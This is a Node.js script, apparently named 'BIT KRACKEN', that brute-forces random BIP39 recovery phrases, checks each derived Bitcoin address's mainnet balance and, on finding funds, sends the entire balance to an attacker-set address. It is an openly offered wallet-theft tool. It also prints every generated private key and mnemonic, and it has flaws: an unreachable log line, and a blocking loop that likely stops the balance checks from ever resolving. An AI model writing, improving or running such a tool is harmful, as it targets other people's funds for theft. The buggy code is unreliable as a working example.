var sleep = require('sleep');
var CoinKey = require('coinkey') //1.0.0
var bip39 = require('bip39')
var hdkey = require('hdkey')
var bitcoinTransaction = require('bitcoin-transaction');
var to = "YOUR BITCOIN ADDRESS HERE"; //change me to who you want the bitcoin to go to
var mnemonic;
var seed;
var seedToKey;
var root;

console.log(`
/=========================\\
|BBB    IIIII  TTTTTTT    |
|B  B     I       T       |
|BBBB     I       T       |
|B   B    I       T       |
|BBBBB  IIIII     T       |
|                  KRACKEN|
\\=========================/
              BIP39 EDITION
`)

bitcoinTransaction.providers.balance.mainnet.default = bitcoinTransaction.providers.balance.mainnet.blockchain;

console.log("Working (This will take *pretty much forever!*)")

while (true) {
mnemonic = bip39.generateMnemonic() //create random Bip39 "recovery phrase"
seed = bip39.mnemonicToSeedSync(mnemonic).toString('hex');  //generate seed bujffer
root = hdkey.fromMasterSeed(seed); //generate hdkey object containing private and public key from seed buffer
seedToKey = root.privateKey;
var ck = new CoinKey(root.privateKey) //Create address from private key, which is from the Bip39 seed, which is from random Bip39 "recovery phrase"
var from = ck.publicAddress;	//Our current "brute forced" address
var privKeyWIF = ck.privateWif; //Private (WIF) key of "brute forced" address in WIF form

console.log(`WIF: ${ck.privateWif}
PRIVATE KEY: ${root.privateKey.toString('hex')}
SEED: ${seed}
MNEMONIC: ${mnemonic}`);
if (bip39.validateMnemonic(mnemonic)) {
	console.log("Valid mnemonic found!")
	try {
	bitcoinTransaction.getBalance(from, { network: "mainnet" }).then((balanceInBTC) => {
		if (balanceInBTC > 0) {
			console.log("Valid BTC found!")
			console.log(`Sending ${balanceInBTC} to ${to}.`)
			return bitcoinTransaction.sendTransaction({
				from: from,
				to: to,
				privKeyWIF: privKeyWIF,
				btc: balanceInBTC,
				network: "mainnet",
				fee: "halfHour"
			});
			console.log(`Congrats! It should take about half an hour to get your ${balanceInBTC} BTC.`)
		} else {
			console.log("Not a real key with a balance, keep going...")
			return "none-yet";
		}
	});
	} catch {
		console.log(`This probably isn't a valid Private Key/Address. This is normal, I think.`)
	}
} else {
	console.log("Still going...")
}

sleep.msleep(25)
}
